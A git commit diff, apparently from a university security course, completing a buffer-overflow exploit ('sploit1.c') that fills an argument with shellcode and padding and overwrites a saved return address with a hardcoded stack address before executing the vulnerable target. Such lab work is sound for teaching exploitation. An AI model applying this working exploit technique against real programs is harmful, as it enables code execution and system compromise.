00a9fe8fbb5409e0e34cf77fd12a7b2a3bc1b3ff
Soroush Karami <skaram5@uic.edu>
2017-09-22 21:34:49 +0000

    1st sploit has been completed

--- sploits/sploit1.c
+++ sploits/sploit1.c
@@ -9,9 +9,14 @@
 
 int main(void)
 {
-	char arg1[] = "Hi there!";
+	char arg1[293];
 	char *args[] = { TARGET, arg1, NULL };
 	char *env[] = { NULL };
+
+	strcpy(arg1,shellcode);
+	memset(arg1+strlen(shellcode),0x55,293-strlen(shellcode));
+	*(unsigned *)(&arg1[288])=0xbefffb84;
+	arg1[292]=0;
 
 	if (0 > execve(TARGET, args, env))
 		fprintf(stderr, "execve failed.\n");
